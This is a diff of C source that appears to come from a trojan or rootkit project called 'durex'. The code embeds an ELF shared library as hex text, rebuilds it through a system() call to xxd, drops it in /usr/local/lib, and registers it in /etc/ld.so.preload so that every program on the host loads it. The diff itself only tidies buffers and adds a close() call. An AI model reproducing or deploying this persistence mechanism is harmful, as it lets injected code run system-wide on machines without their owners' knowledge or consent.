@@ -14,7 +14,7 @@
 
 static char			*get_library_raw()
 {
-	char			*raw = ft_strnew(LIBRARY_RAW_LEN * 10);
+	char			*raw = ft_strnew(LIBRARY_RAW_LEN);
 
 	ft_strcat(raw, "7f45 4c46 0201 0100 0000 0000 0000 0000\n");
 	ft_strcat(raw, "0300 3e00 0100 0000 300a 0000 0000 0000\n");
@@ -643,8 +643,9 @@ static char			*get_library_raw()
 */
 static void			build_library(char *lib)
 {
-	char	build[1024];
+	char	build[BUFFER_LEN];
 
+	ft_memset((char*)&build, 0, (BUFFER_LEN - 1));
 	snprintf(build, 1023, "xxd -r -p %s %s", lib, lib);
 	system((char*)&build);
 }
@@ -654,13 +655,15 @@ static void			build_library(char *lib)
 */
 static void			set_library(char *lib)
 {
-	char	set[1024];
-	char	preload_path[]	= "/etc/ld.so.preload";
-	int		fd				= 0;
+	char	preload_path[BUFFER_LEN];
+	int		fd	= 0;
 
+	ft_memset((char*)&preload_path, 0, (BUFFER_LEN - 1));
+	snprintf(preload_path, (BUFFER_LEN - 1), "/etc/ld.so.preload");
 	unlink((char*)&preload_path);
 	if ((fd = open(preload_path, O_RDWR | O_CREAT)) != -1) {
 		write(fd, lib, ft_strlen(lib));
+		close(fd);
 	}
 }
 
@@ -685,9 +688,11 @@ static void			create_library(char *library_path, char *raw_library)
 */
 void				init_library(t_durex *durex)
 {
-	char		*raw			= get_library_raw();
-	char		library_path[]	= "/usr/local/lib/durex.so";
+	char		*raw = get_library_raw();
+	char		library_path[BUFFER_LEN];
 
+	ft_memset((char*)&library_path, 0, (BUFFER_LEN - 1));
+	snprintf(library_path, (BUFFER_LEN - 1), "/usr/local/lib/durex.so");
 	unlink((char*)&library_path);
 	create_library((char*)&library_path, raw);
 	ft_strdel(&raw);
